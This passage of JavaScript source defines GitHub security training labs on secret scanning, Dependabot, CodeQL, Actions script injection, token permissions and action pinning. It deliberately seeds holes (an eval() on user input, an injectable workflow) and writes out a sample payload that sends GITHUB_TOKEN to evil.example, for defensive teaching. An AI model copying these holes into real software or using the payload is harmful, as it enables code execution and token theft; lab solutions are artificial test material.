      "echo 'Commits on main are signed.' >> README.md", "git commit -am 'docs: note that commits are signed'", "git cat-file -p HEAD", "git log --show-signature -1",
      "echo 'dev@kestrel.io namespaces=\"git\"' \"$(cat ~/.ssh/id_ed25519.pub)\" > ~/.ssh/allowed_signers", "git config --global gpg.ssh.allowedSignersFile ~/.ssh/allowed_signers", "git log --show-signature -1",
      "gh ssh-key add ~/.ssh/id_ed25519.pub --type signing --title 'kc-dev-01 signing'", "git push", "gh api repos/kestrel/kestrel-api/commits/$(git rev-parse HEAD) --jq .commit.verification",
      "gh api -X POST repos/kestrel/kestrel-api/branches/main/protection/required_signatures"),
    debrief: "<p>Your commits now carry proof: a signature from a key only your laptop has, checkable on your machine with an allowed-signers file and shown as <b>Verified</b> on GitHub. With required signatures on, a commit pushed under someone else's name, or by a stolen token without the key, simply doesn't land on <code>main</code>.</p><p>One habit to keep: if a laptop is lost, remove its keys from GitHub (both kinds). Next: the security features GitHub runs for you.</p>",
    realworld: "Run git log --show-signature on a project you contribute to, or look for the Verified badge in its commit list. GitHub's docs on \"Commit signature verification\" cover GPG and S/MIME too; tools like gitsign (Sigstore) sign without long-lived keys at all.",
    quiz: [
      { q: "What does a commit's author name and email prove on its own?", options: ["Who wrote it", "Nothing: anyone can set any name and email", "That GitHub checked it", "That it was reviewed"], answer: 1, why: "user.name and user.email are free text. Only a signature ties a commit to a key." },
      { q: "Your signed commit shows reason: bad_email. Why?", options: ["The signature is broken", "The committer email isn't one of the signing key owner's account emails", "The key expired", "The commit is too old"], answer: 1, why: "GitHub checks that the key belongs to an account and that the committer email belongs to the same account." },
      { q: "What breaks an existing commit's signature?", options: ["Pushing it", "Rewriting it (rebase, amend, filter-repo): it becomes a new commit", "Cloning it", "Viewing it on GitHub"], answer: 1, why: "The signature covers the commit's exact content; any rewrite creates a different, unsigned commit (unless re-signed)." }
    ]
  });

  /* ================================================================== GT-131 GitHub security features */
  var VULN_PKG = Object.assign({}, M3.WEB_PKG, { dependencies: { marked: "^14.1.0", lodash: "^4.17.20" } });
  function vulnLock(pkg) {
    var lock = JSON.parse(A.lockFor(pkg, { lodash: "4.17.20" }));
    lock.packages["node_modules/minimist"] = { version: "1.2.5", resolved: "https://registry.npmjs.org/minimist/-/minimist-1.2.5.tgz", integrity: "sha512-FM9nNUYrRBAELZQT3xeZQ7fmMOBg6nWNmJKTcgsJeaLstP/UODVpGsr5OhXhhXg6f+qtJ8uiZ+PUxkDWcgIXLw==", dev: true, license: "MIT" };
    return JSON.stringify(lock, null, 2) + "\n";
  }
  T.M4.vulnLock = vulnLock; T.M4.VULN_PKG = VULN_PKG;
  var PREVIEW_JS = "// Local preview server for the pricing page: node scripts/preview-server.js\nconst http = require(\"http\");\n\nhttp.createServer((req, res) => {\n  const url = new URL(req.url, \"http://localhost\");\n  if (url.pathname === \"/calc\") {\n    // price calculator: /calc?expr=12*5\n    const total = eval(url.searchParams.get(\"expr\"));\n    res.end(String(total));\n    return;\n  }\n  res.end(\"Kestrel preview\");\n}).listen(8080);\n";
  var PREVIEW_FIXED = PREVIEW_JS.replace("    // price calculator: /calc?expr=12*5\n    const total = eval(url.searchParams.get(\"expr\"));", "    // price calculator: /calc?months=12 (5 EUR a month)\n    const months = Number.parseInt(url.searchParams.get(\"months\"), 10) || 0;\n    const total = months * 5;");
  var CODEQL_WF = "name: CodeQL\n\non:\n  push:\n    branches: [main]\n  pull_request:\n\npermissions:\n  contents: read\n  security-events: write\n\njobs:\n  analyze:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n      - uses: github/codeql-action/init@v3\n        with:\n          languages: javascript-typescript\n      - uses: github/codeql-action/analyze@v3\n";
  T.M4.CODEQL_WF = CODEQL_WF; T.M4.PREVIEW_JS = PREVIEW_JS;
  function ghsecWorld(sys) {
    world(sys);
    A.installNode(sys);
    var files = M3.webFiles(VULN_PKG); files["package-lock.json"] = vulnLock(VULN_PKG); files["scripts/preview-server.js"] = PREVIEW_JS; files[".github/workflows/ci.yml"] = M3.CI_BASIC;
    GH.seed(sys, "kestrel/kestrel-web", { steps: [{ msg: "Kestrel website 2.3", by: "maya", at: "2026-10-01 10:00", files: files, exec: ["test/run.sh", "scripts/build.sh"] }] }, { description: "The Kestrel Cloud website" });
    GH.find(sys, "kestrel/kestrel-web").collab["kc-dev"] = "admin";
    GH.cloneTo(sys, "kestrel/kestrel-web", HOME + "/kestrel-web");
  }
  LABS.push({
    id: "gt-131", n: 31, module: 4, ticket: "GT-131", xp: 220,
    title: "GitHub security features",
    topic: "secret scanning, Dependabot, CodeQL",
    from: DEV,
    story: "<p>GitHub can watch <code>kestrel/kestrel-web</code> for us: leaked secrets, dependencies with known vulnerabilities, and dangerous code. None of it is turned on. Turn it on, act on what it finds, and leave it in a state where it keeps working without anyone remembering to look. You're an admin; the repository is cloned in <code>~/kestrel-web</code>.</p>",
    learn:
      '<table class="t"><tr><th>Feature</th><th>Finds</th><th>Turn on</th></tr>' +
      "<tr><td><b>Secret scanning</b></td><td>tokens and keys from known providers (and custom patterns), anywhere in the history</td><td><code>gh repo edit --enable-secret-scanning</code></td></tr>" +
      "<tr><td><b>Push protection</b></td><td>the same, but <i>blocks the push</i> (error GH013) before the secret reaches GitHub</td><td><code>gh repo edit --enable-secret-scanning-push-protection</code></td></tr>" +
      "<tr><td><b>Dependabot alerts</b></td><td>dependencies (from lock files) with published vulnerabilities</td><td><code>gh api -X PUT repos/O/R/vulnerability-alerts</code></td></tr>" +
      "<tr><td><b>Dependabot security updates</b></td><td>opens pull requests that upgrade to the fixed version</td><td><code>gh api -X PUT repos/O/R/automated-security-fixes</code></td></tr>" +
      "<tr><td><b>Code scanning (CodeQL)</b></td><td>bugs like injection in your own code, by analysing it</td><td>a workflow (below)</td></tr></table>" +
      "<h3>Reading alerts from the terminal</h3>" + code("gh api repos/O/R/dependabot/alerts --jq '.[] | [.number, .state, .dependency.package.name, .security_advisory.severity]'\ngh api repos/O/R/secret-scanning/alerts\ngh api repos/O/R/code-scanning/alerts --jq '.[] | [.number, .state, .rule.id]'") +
      "<p>Each Dependabot alert names the package, the vulnerable range, the advisory (GHSA and CVE ids) and the first fixed version. A security update pull request comes from <code>dependabot[bot]</code>: let CI run on it, review, and merge like any other pull request. When the fixed version lands on <code>main</code>, the alert closes itself.</p>" +
      "<h3>CodeQL</h3><p>CodeQL builds a database of your code and runs security queries over it. It runs as a workflow that needs permission to upload results:</p>" +
      code("permissions:\n  contents: read\n  security-events: write\n...\n      - uses: actions/checkout@v4\n      - uses: github/codeql-action/init@v3\n        with:\n          languages: javascript-typescript\n      - uses: github/codeql-action/analyze@v3") +
      "<p>Results on the default branch become alerts; fix the code in a pull request, and when the fix reaches <code>main</code> the next analysis marks the alert <i>fixed</i>. <code>eval()</code> on anything a user sends is a textbook finding: it runs whatever code they type.</p>",
    system: ghsecWorld,
    starter: "",
    objectives: [
      {
        id: "enable", text: "Turn on secret scanning, push protection, Dependabot alerts and Dependabot security updates for <code>kestrel/kestrel-web</code>.",
        hints: ["Two settings via gh repo edit, two via gh api -X PUT (vulnerability-alerts, automated-security-fixes).", "gh repo edit kestrel/kestrel-web --enable-secret-scanning --enable-secret-scanning-push-protection\ngh api -X PUT repos/kestrel/kestrel-web/vulnerability-alerts\ngh api -X PUT repos/kestrel/kestrel-web/automated-security-fixes"],
        check: function (r) { var s = gh(r, "kestrel/kestrel-web").settings, miss = []; if (!s.secretScanning) miss.push("secret scanning"); if (!s.pushProtection) miss.push("push protection"); if (!s.dependabotAlerts) miss.push("Dependabot alerts"); if (!s.dependabotUpdates) miss.push("Dependabot security updates"); return miss.length ? "Still off: " + miss.join(", ") + "." : true; }
      },
      {
        id: "deps", text: "Dependabot finds vulnerable dependencies and opens pull requests. Check each one's CI and merge them, until no Dependabot alert is open.",
        hints: ["gh api repos/kestrel/kestrel-web/dependabot/alerts shows them; gh pr list shows Dependabot's pull requests; gh pr checks N, then gh pr merge N --squash.", "gh pr list\ngh pr checks 1\ngh pr merge 1 --squash --delete-branch\ngh pr merge 2 --squash --delete-branch\ngh api repos/kestrel/kestrel-web/dependabot/alerts --jq '.[] | [.number, .state, .dependency.package.name]'"],
        check: function (r) {
          var al = gh(r, "kestrel/kestrel-web").alerts.dependabot;
          if (!al.length) return "No Dependabot alerts yet: turn on Dependabot alerts first.";
          var open = al.filter(function (a) { return a.state === "open"; });
          if (open.length) return "Still open: " + open.map(function (a) { return a.pkg + " (" + a.adv.sev + ")"; }).join(", ") + ".";
          if (al.some(function (a) { return a.state === "dismissed"; })) return "Fix the alerts rather than dismissing them: the fixed versions exist.";
          return prs(r, "kestrel/kestrel-web").some(function (p) { return p.author === "dependabot[bot]" && p.state === "merged"; }) ? true : "Merge Dependabot's pull requests (they carry the fix).";
        }
      },
      {
        id: "codeql", text: "Add CodeQL code scanning for the JavaScript (a workflow on <code>main</code> that runs on pushes to <code>main</code> and on pull requests), then fix what it finds through a pull request, until its alert is <b>fixed</b>.",
        hints: ["Create .github/workflows/codeql.yml (permissions: security-events: write; init with languages: javascript-typescript; analyze), push it to main, read the alert, fix scripts/preview-server.js on a branch, PR, merge.", "The alert is js/code-injection: eval() runs whatever the visitor sends. Parse a number instead, e.g. const months = Number.parseInt(url.searchParams.get(\"months\"), 10) || 0; const total = months * 5;"],
        check: function (r) {
          var w = wfsOn(r, "kestrel/kestrel-web", "main").filter(function (x) { return Object.keys(jobsOf(x)).some(function (k) { return steps(jobsOf(x)[k]).some(function (s) { return s && /github\/codeql-action\/analyze/.test(s.uses || ""); }); }); })[0];
          if (!w) return "main has no workflow running github/codeql-action/analyze yet.";
          if (!("pull_request" in w.on) || !("push" in w.on)) return "Run CodeQL on pull requests and pushes to main.";
          var a = gh(r, "kestrel/kestrel-web").alerts.code.filter(function (x) { return x.rule.id === "js/code-injection"; })[0];
          if (!a) return "No code scanning alert yet: is the analysis allowed to upload (security-events: write)? gh run view the CodeQL run.";
          if (a.state === "dismissed") return "Fix the code instead of dismissing the alert.";
          if (a.state !== "fixed") return "The js/code-injection alert is still open: fix scripts/preview-server.js through a pull request.";
          return prs(r, "kestrel/kestrel-web").some(function (p) { return p.state === "merged" && GH.prFiles(r.sys, gh(r, "kestrel/kestrel-web"), p).indexOf("scripts/preview-server.js") >= 0; }) ? true : "The fix should arrive through a pull request.";
        }
      }
    ],
    solution: sol("cd ~/kestrel-web", "gh repo edit --enable-secret-scanning --enable-secret-scanning-push-protection", "gh api -X PUT repos/kestrel/kestrel-web/vulnerability-alerts", "gh api -X PUT repos/kestrel/kestrel-web/automated-security-fixes",
      "gh api repos/kestrel/kestrel-web/dependabot/alerts --jq '.[] | [.number, .state, .dependency.package.name, .security_advisory.severity]'", "gh pr list", "gh pr checks 1", "gh pr merge 1 --squash --delete-branch", "gh pr checks 2", "gh pr merge 2 --squash --delete-branch",
      "gh api repos/kestrel/kestrel-web/dependabot/alerts --jq '.[] | [.number, .state, .dependency.package.name]'", "git pull",
      { nano: ".github/workflows/codeql.yml", text: CODEQL_WF }, "git add .github", "git commit -m 'ci: add CodeQL code scanning'", "git push",
      "gh api repos/kestrel/kestrel-web/code-scanning/alerts --jq '.[] | [.number, .state, .rule.id, .most_recent_instance.location.path]'",
      "git switch -c fix/no-eval", { nano: "scripts/preview-server.js", text: PREVIEW_FIXED }, "git commit -am 'fix: parse the months instead of eval-ing user input'", "git push -u origin fix/no-eval",
      "gh pr create --title 'fix: parse the months instead of eval-ing user input' --body 'Fixes code scanning alert js/code-injection.'", "gh pr checks", "gh pr merge --squash --delete-branch",
      "gh api repos/kestrel/kestrel-web/code-scanning/alerts --jq '.[] | [.number, .state, .rule.id]'"),
    debrief: "<p>Three kinds of automatic watch are now on: secrets (and push protection blocks new ones at the door), vulnerable dependencies (Dependabot raised the alerts <i>and</i> wrote the fixes; you only reviewed and merged), and dangerous code (CodeQL caught an <code>eval</code> on user input, a remote code execution waiting to happen).</p><p>The part that matters most: every one of these closes its own alert when the fix reaches <code>main</code>, so the security tab reflects reality without anyone maintaining it. Next: the workflows themselves can be attacked.</p>",
    realworld: "On a repository of your own: Settings → Code security shows all of these (most are free for public repositories). Dependabot can also keep everything up to date, not just vulnerable versions, with a .github/dependabot.yml.",
    quiz: [
      { q: "What's the difference between secret scanning and push protection?", options: ["None", "Scanning alerts after a secret is in the repository; push protection rejects the push before it gets there", "Push protection only works on main", "Scanning is for code, protection is for secrets"], answer: 1, why: "Push protection stops the secret at the door; scanning finds what's already inside (including old history)." },
      { q: "A Dependabot alert names a package you only use in tests. Best move?", options: ["Ignore it forever", "Still upgrade (it's usually trivial); dismiss with a reason only if it truly can't affect you", "Delete the tests", "Disable Dependabot"], answer: 1, why: "Upgrading is cheap and removes the doubt; dismissals should be deliberate and recorded." },
      { q: "Why does the CodeQL workflow need security-events: write?", options: ["To read the code", "To upload its results as code scanning alerts", "To push fixes", "It doesn't"], answer: 1, why: "The analysis runs on the runner; uploading the findings to GitHub needs that permission." }
    ]
  });

  /* ================================================================== GT-132 Securing Actions */
  var TRIAGE_WF = "name: Triage\n\non:\n  issues:\n    types: [opened]\n\njobs:\n  label:\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo \"New issue: ${{ github.event.issue.title }}\"\n      - run: gh issue edit \"$NUMBER\" --add-label needs-triage\n        env:\n          GH_TOKEN: ${{ github.token }}\n          GH_REPO: ${{ github.repository }}\n          NUMBER: ${{ github.event.issue.number }}\n";
  var TRIAGE_FIXED = "name: Triage\n\non:\n  issues:\n    types: [opened]\n\npermissions: {}\n\njobs:\n  label:\n    runs-on: ubuntu-latest\n    permissions:\n      issues: write\n    steps:\n      - run: echo \"New issue: $TITLE\"\n        env:\n          TITLE: ${{ github.event.issue.title }}\n      - run: gh issue edit \"$NUMBER\" --add-label needs-triage\n        env:\n          GH_TOKEN: ${{ github.token }}\n          GH_REPO: ${{ github.repository }}\n          NUMBER: ${{ github.event.issue.number }}\n";
  var CI_LOOSE = "name: CI\n\non:\n  push:\n    branches: [main]\n  pull_request:\n\npermissions: write-all\n\njobs:\n  test:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n      - uses: actions/setup-node@v4\n        with:\n          node-version: 22\n      - run: npm ci\n      - run: npm test\n      - uses: notify-hub/slack-notify@v2\n        with:\n          webhook-url: ${{ secrets.SLACK_WEBHOOK }}\n          message: CI passed on ${{ github.ref_name }}\n";
  function pinnedCI(sha) { return CI_LOOSE.replace("permissions: write-all", "permissions:\n  contents: read").replace("notify-hub/slack-notify@v2", "notify-hub/slack-notify@" + sha + " # v2.3.1"); }
  T.M4.TRIAGE_WF = TRIAGE_WF; T.M4.CI_LOOSE = CI_LOOSE;
  var EVIL = "Website down\"; echo \"INJECTED $GITHUB_REPOSITORY";
  function actionsWorld(sys) {
    world(sys);
    A.installNode(sys);
    var files = M3.webFiles(); files[".github/workflows/triage.yml"] = TRIAGE_WF; files[".github/workflows/ci.yml"] = CI_LOOSE;
    GH.seed(sys, "kestrel/kestrel-web", { steps: [{ msg: "Kestrel website 2.3", by: "maya", at: "2026-10-01 10:00", files: files, exec: ["test/run.sh", "scripts/build.sh"] }] }, { private: false, description: "The Kestrel Cloud website" });
    var r = GH.find(sys, "kestrel/kestrel-web");
    r.collab["kc-dev"] = "admin";
    r.settings.actionsPermissions = "write";
    r.labels.push({ name: "needs-triage", color: "fbca04", description: "Someone should look at this" });
    r.secrets.SLACK_WEBHOOK = { value: A.chatHook(sys, "#ci-alerts"), updated: G.clock(sys) - 86400 * 30 };
    GH.user(sys, "mallory-x", { name: "mallory-x", email: "mallory@example.com" });
    var it = GH.issue(sys, "kestrel/kestrel-web", { title: EVIL, body: "The site is down for me.", author: "mallory-x", daysAgo: 0 });
    GH.emit(sys, "issue.opened", { repo: r, issue: it });
    GH.cloneTo(sys, "kestrel/kestrel-web", HOME + "/kestrel-web");
  }
  function v231(r) { var x = gh(r, "notify-hub/slack-notify"); return x ? G.peel(r.sys, x.refs["refs/tags/v2.3.1"]) : null; }
  function injected(run) { return run.jobs.some(function (j) { return j.steps.some(function (s) { return s.log.some(function (l) { return /^INJECTED\b/.test(l.text); }); }); }); }
  LABS.push({
    id: "gt-132", n: 32, module: 4, ticket: "GT-132", xp: 220,
    title: "Securing Actions",
    topic: "script injection, GITHUB_TOKEN, pinning",
    from: DEV,
    story: "<p>Look at the <i>Triage</i> run for the issue <code>mallory-x</code> opened on <code>kestrel/kestrel-web</code> an hour ago (<code>gh run list</code>, then <code>gh run view RUN_ID --log</code>). Her issue <b>title ran as a command</b> on our runner, with a token that could write to the repository. Workflows are code that runs with our credentials, so they need the same care as the app. Fix the injection, cut every token down to what it needs, and pin the third-party action we use. You're an admin; the repository is in <code>~/kestrel-web</code>.</p>",
    learn:
      "<h3>Script injection</h3><p><code>${{ }}</code> is filled in <b>before</b> the shell sees the script. So this:</p>" +
      code("- run: echo \"New issue: ${{ github.event.issue.title }}\"") +
      "<p>with a title like <code>x\"; curl evil.example/steal?t=$GITHUB_TOKEN; echo \"</code> becomes a script that runs the attacker's command. Anything a stranger controls is untrusted: issue and pull request titles and bodies, comments, branch names, commit messages. The fix: pass it through an environment variable, so it stays data:</p>" +
      code("- run: echo \"New issue: $TITLE\"\n  env:\n    TITLE: ${{ github.event.issue.title }}") +
      "<h3>Least privilege for GITHUB_TOKEN</h3><p>Set the repository default to read-only, then grant per workflow or job only what it needs:</p>" +
      code("gh api -X PUT repos/O/R/actions/permissions/workflow -f default_workflow_permissions=read\n\npermissions: {}            # workflow level: nothing...\njobs:\n  label:\n    permissions:\n      issues: write        # ...except this job may label issues") +
      "<p><code>permissions: write-all</code> hands every step (and every action it uses) the keys to the repository.</p>" +
      "<h3>Pin third-party actions to a commit</h3><p><code>uses: someone/action@v2</code> runs whatever <code>v2</code> points to <i>today</i>. Tags can be moved: in March 2025, attackers moved the tags of the popular <code>tj-actions/changed-files</code> to a commit that dumped CI secrets into logs. A full commit SHA can't be moved:</p>" +
      code("git ls-remote --tags https://github.com/notify-hub/slack-notify      # tag → commit\ngh api repos/notify-hub/slack-notify/git/ref/tags/v2.3.1 --jq .object.sha\n\n- uses: notify-hub/slack-notify@1a2b3c...full-40-char-sha # v2.3.1") +
      "<p>Keep the version in a comment so humans (and Dependabot) know what it is. GitHub's own <code>actions/*</code> are lower risk, but many teams pin everything.</p>" +
      "<h3>pull_request_target</h3><p>It runs with the base repository's secrets and a write token, even for pull requests from forks. Never check out and run the pull request's code in it.</p>",
    system: actionsWorld,
    starter: "",
    objectives: [
      {
        id: "inject", text: "Fix the script injection in <code>.github/workflows/triage.yml</code> and push it to <code>main</code>. Then prove it: open an issue whose title tries the same trick, and check its run printed the title as plain text instead of running it.",
        hints: ["Move ${{ github.event.issue.title }} out of run: into env: (TITLE: ...) and use \"$TITLE\". Push, then gh issue create --title 'Test\"; echo \"INJECTED' --body test, and gh run view the new Triage run's log.", "      - run: echo \"New issue: $TITLE\"\n        env:\n          TITLE: ${{ github.event.issue.title }}\nThen: gh issue create --title 'Test\"; echo \"INJECTED' --body 'Checking the triage fix'"],
        check: function (r) {
          var w = wfsOn(r, "kestrel/kestrel-web", "main").filter(function (x) { return /triage\.ya?ml$/.test(x.path); })[0];
          if (!w || w.errors.length) return w ? "GitHub can't read triage.yml: " + w.errors[0] : "Keep .github/workflows/triage.yml.";
          var bad = Object.keys(jobsOf(w)).some(function (k) { return steps(jobsOf(w)[k]).some(function (s) { return s && s.run !== undefined && /\$\{\{\s*github\.event\.issue\.(title|body)/.test(String(s.run)); }); });
          if (bad) return "A run: line still puts ${{ github.event.issue.title }} into the script. Pass it through env: instead.";
          var test = runs(r, "kestrel/kestrel-web", function (x) { return x.event === "issues" && x.payload.issue && /"\s*;/.test(x.payload.issue.title) && x.payload.issue.user.login === "kc-dev" && x.wfName === "Triage"; })[0];
          if (!test) return "Now prove it: open an issue whose title contains \"; echo \"INJECTED (gh issue create --title ... --body ...).";
          if (test.wfPath && injected(test)) return "The test issue's title still ran as a command (a log line starts with INJECTED).";
          return test.conclusion === "success" ? true : "The Triage run for your test issue failed: gh run view " + test.id + " --log-failed.";
        }
      },
      {
        id: "least", text: "Least privilege everywhere: the repository's default workflow token is read-only, no workflow uses <code>write-all</code>, CI only reads contents, and the triage job can write issues and nothing else (and still labels new issues).",
        hints: ["gh api -X PUT repos/kestrel/kestrel-web/actions/permissions/workflow -f default_workflow_permissions=read. In ci.yml: permissions: contents: read. In triage.yml: permissions: {} at the top and issues: write on the job.", "The Learn tab shows both blocks. After pushing, open another test issue: it should still get the needs-triage label."],
        check: function (r) {
          var x = gh(r, "kestrel/kestrel-web");
          if (x.settings.actionsPermissions !== "read") return "Set the repository's default workflow permissions to read (gh api -X PUT .../actions/permissions/workflow -f default_workflow_permissions=read).";
          var ws = wfsOn(r, "kestrel/kestrel-web", "main"), probs = [];
          ws.forEach(function (w) {
            if (!w.doc) return;
            if (/write-all/.test(w.text)) probs.push(w.file + " still uses write-all");
            Object.keys(jobsOf(w)).forEach(function (k) {
              var p = A.permsFor(x, w.doc.permissions, jobsOf(w)[k].permissions, false), writes = Object.keys(p).filter(function (s) { return p[s] === "write"; });
              if (/triage/.test(w.file)) { if (writes.join() !== "issues") probs.push("the triage job should write issues only (it writes: " + (writes.join(", ") || "nothing") + ")"); }
              else if (writes.length) probs.push(w.file + "'s " + k + " job can write " + writes.join(", "));
            });
          });
          if (probs.length) return probs[0] + ".";
          var labelled = x.items.filter(function (i) { return i.type === "issue" && i.author === "kc-dev" && i.labels.indexOf("needs-triage") >= 0; }).length;
          return labelled ? true : "Make sure triage still works: open a test issue after your changes; it should get the needs-triage label.";
        }
      },
      {
        id: "pin", text: "Pin <code>notify-hub/slack-notify</code> in CI to the full commit SHA of its <code>v2.3.1</code> release (with the version in a comment), and keep CI green on <code>main</code>.",
        hints: ["git ls-remote --tags https://github.com/notify-hub/slack-notify shows each tag's commit. Replace @v2 with @SHA # v2.3.1.", "gh api repos/notify-hub/slack-notify/git/ref/tags/v2.3.1 --jq .object.sha\nthen in ci.yml: uses: notify-hub/slack-notify@<that sha> # v2.3.1"],
        check: function (r) {
          var w = wfsOn(r, "kestrel/kestrel-web", "main").filter(function (x) { return x.name === "CI"; })[0], sha = v231(r);
          if (!w || w.errors.length) return w ? "GitHub can't read ci.yml: " + w.errors[0] : "Keep the CI workflow.";
          var u = []; Object.keys(jobsOf(w)).forEach(function (k) { steps(jobsOf(w)[k]).forEach(function (s) { if (s && /^notify-hub\/slack-notify@/.test(s.uses || "")) u.push(String(s.uses)); }); });
          if (!u.length) return "Keep the notify step (notify-hub/slack-notify).";
          if (u.some(function (x) { return x !== "notify-hub/slack-notify@" + sha; })) return "Pin it to v2.3.1's full commit SHA (40 hex characters), not a tag or another release.";
          if (!/notify-hub\/slack-notify@[0-9a-f]{40}\s+#\s*v2\.3\.1/.test(w.text)) return "Add the version as a comment after the SHA: # v2.3.1";
          var run = runs(r, "kestrel/kestrel-web", function (z) { return z.wfName === "CI" && z.event === "push" && z.headSha === tip(r, "kestrel/kestrel-web", "main"); })[0];
          return run && run.conclusion === "success" ? true : "CI on main's newest commit should pass.";
        }
      }
    ],
    solution: sol("cd ~/kestrel-web", "gh run list", "gh run view $(gh run list -w Triage -L 1 --json databaseId -q '.[0].databaseId') --log",
      { nano: ".github/workflows/triage.yml", text: TRIAGE_FIXED }, "gh api -X PUT repos/kestrel/kestrel-web/actions/permissions/workflow -f default_workflow_permissions=read",
      "git ls-remote --tags https://github.com/notify-hub/slack-notify", { nano: ".github/workflows/ci.yml", text: CI_LOOSE.replace("permissions: write-all", "permissions:\n  contents: read") },
      "sed -i \"s|notify-hub/slack-notify@v2|notify-hub/slack-notify@$(gh api repos/notify-hub/slack-notify/git/ref/tags/v2.3.1 --jq .object.sha) # v2.3.1|\" .github/workflows/ci.yml",
      "cat .github/workflows/ci.yml", "git commit -am 'ci: stop script injection, least-privilege tokens, pin third-party actions'", "git push",
      "gh issue create --title 'Test\"; echo \"INJECTED' --body 'Checking the triage fix'", "gh run view $(gh run list -w Triage -L 1 --json databaseId -q '.[0].databaseId') --log", "gh issue list --label needs-triage"),
    debrief: "<p>Mallory's title is just text again. The injection was possible because <code>${{ }}</code> pastes values into the script before Bash parses it; going through <code>env:</code> keeps untrusted input as data. And even if something does slip through now, the token it can reach can only label issues, not push code or create releases.</p><p>The pin protects you from the other direction: if <code>slack-notify</code>'s maintainers (or someone who steals their account) move the <code>v2</code> tag, your workflow keeps running the exact code you reviewed. Next: the rest of the supply chain.</p>",
    realworld: "Search your organisation's workflows for \"${{ github.event.\" inside run: lines; tools like zizmor and CodeQL's actions queries find these automatically. StepSecurity's harden-runner and the OpenSSF Scorecard check pinning and token permissions.",
    quiz: [
      { q: "Why is run: echo \"${{ github.event.pull_request.title }}\" dangerous?", options: ["Titles can be long", "The title is pasted into the script before the shell runs it, so a crafted title becomes commands", "echo is slow", "Titles aren't available in PR events"], answer: 1, why: "Expressions are expanded into the script text; the shell then runs whatever the attacker wrote." },
      { q: "What does pinning an action to a commit SHA protect against?", options: ["Typos", "The tag being moved to different (malicious) code later", "Slow downloads", "Expired tokens"], answer: 1, why: "Tags are movable pointers; a commit SHA always means the same code." },
      { q: "A job only comments on pull requests. Which permissions?", options: ["write-all", "pull-requests: write (and nothing else)", "contents: write", "none at all"], answer: 1, why: "Grant exactly the scope the job uses; everything else stays read or none." }
    ]
  });

  /* ================================================================== GT-133 Supply chain */
  var OIDC_SH = "#!/bin/bash\n# Swap GitHub's OIDC token for a 15-minute Kestrel deploy token, and print it.\n# The job needs: permissions: id-token: write\nset -euo pipefail\n: \"${ACTIONS_ID_TOKEN_REQUEST_URL:?no OIDC token available: give the job permissions: id-token: write}\"\nid_token=$(curl -fsS -H \"Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN\" \"$ACTIONS_ID_TOKEN_REQUEST_URL&audience=deploy.kestrel.io\" | jq -r .value)\ncurl -fsS -X POST https://deploy.kestrel.io/api/oidc/token -d \"id_token=$id_token\" | jq -r .token\n";
  var DEPLOY_OIDC = "name: Deploy\n\non:\n  push:\n    branches: [main]\n\npermissions:\n  contents: read\n  id-token: write\n\njobs:\n  staging:\n    runs-on: ubuntu-latest\n    environment: staging\n    steps:\n      - uses: actions/checkout@v4\n      - run: |\n          DEPLOY_TOKEN=\"$(bash scripts/oidc-login.sh)\"\n          export DEPLOY_TOKEN\n          bash scripts/deploy.sh\n        env:\n          SITE: ${{ vars.SITE }}\n\n  production:\n    needs: staging\n    runs-on: ubuntu-latest\n    environment: production\n    steps:\n      - uses: actions/checkout@v4\n      - run: |\n          DEPLOY_TOKEN=\"$(bash scripts/oidc-login.sh)\"\n          export DEPLOY_TOKEN\n          bash scripts/deploy.sh\n        env:\n          SITE: ${{ vars.SITE }}\n";
  var DEPREVIEW_WF = "name: Dependency review\n\non:\n  pull_request:\n\npermissions:\n  contents: read\n\njobs:\n  dependency-review:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n      - uses: actions/dependency-review-action@v4\n        with:\n          fail-on-severity: high\n";
  T.M4.OIDC_SH = OIDC_SH; T.M4.DEPLOY_OIDC = DEPLOY_OIDC; T.M4.DEPREVIEW_WF = DEPREVIEW_WF;
  function supplyWorld(sys) {
    world(sys);
    A.installNode(sys);
    var files = M3.webFiles(); files["scripts/deploy.sh"] = M3.DEPLOY_SH; files["scripts/oidc-login.sh"] = OIDC_SH; files[".github/workflows/deploy.yml"] = M3.DEPLOY_WF;
    GH.seed(sys, "kestrel/kestrel-web", { steps: [{ msg: "Kestrel website 2.3 with deploys", by: "maya", at: "2026-10-01 10:00", files: files, exec: ["test/run.sh", "scripts/build.sh", "scripts/deploy.sh", "scripts/oidc-login.sh"] }] }, { description: "The Kestrel Cloud website" });
    var r = GH.find(sys, "kestrel/kestrel-web");
    r.collab["kc-dev"] = "admin";
    r.vars.SITE = { value: "kestrel-web", updated: G.clock(sys) - 86400 * 9 };
    M3.envs(sys, "kestrel/kestrel-web", { site: "kestrel-web", prodToken: true, stagingToken: true });
    A.trust(sys, "repo:kestrel/kestrel-web:environment:staging", "kestrel-web", "staging");
    A.trust(sys, "repo:kestrel/kestrel-web:environment:production", "kestrel-web", "production");
    // once dependency review is on main, Ana opens a pull request that adds a vulnerable lodash
    var opened = false;
    GH.on(sys, "push", function (s2, d) {
      if (opened || d.repo.full !== "kestrel/kestrel-web" || d.ref !== "refs/heads/main" || !d.after) return;
      if (!A.workflowsAt(s2, d.after).some(function (w) { return /dependency-review-action/.test(w.text); })) return;
      opened = true;
      var x = d.repo, pkg = Object.assign({}, M3.WEB_PKG, { dependencies: { marked: "^14.1.0", lodash: "^4.17.20" } }), lock = JSON.parse(A.lockFor(pkg, { lodash: "4.17.20" }));
      x.refs["refs/heads/feature/price-table"] = d.after;
      GH.commit(s2, x.full, "feature/price-table", "ana", "Add a price table helper", { "package.json": JSON.stringify(pkg, null, 2) + "\n", "package-lock.json": JSON.stringify(lock, null, 2) + "\n", "site/prices.html": M3.page("Prices", "<h1>Prices</h1>\n<a href=\"index.html\">Home</a>") });
      GH.openPR(s2, x.full, { title: "Add a price table page", body: "Uses lodash for the table formatting.", author: "ana-silva", head: "feature/price-table" });
    });
    GH.cloneTo(sys, "kestrel/kestrel-web", HOME + "/kestrel-web");
  }
  LABS.push({
    id: "gt-133", n: 33, module: 4, ticket: "GT-133", xp: 220,
    title: "Supply chain",
    topic: "SBOMs, dependency review, OIDC",
    from: DEV,
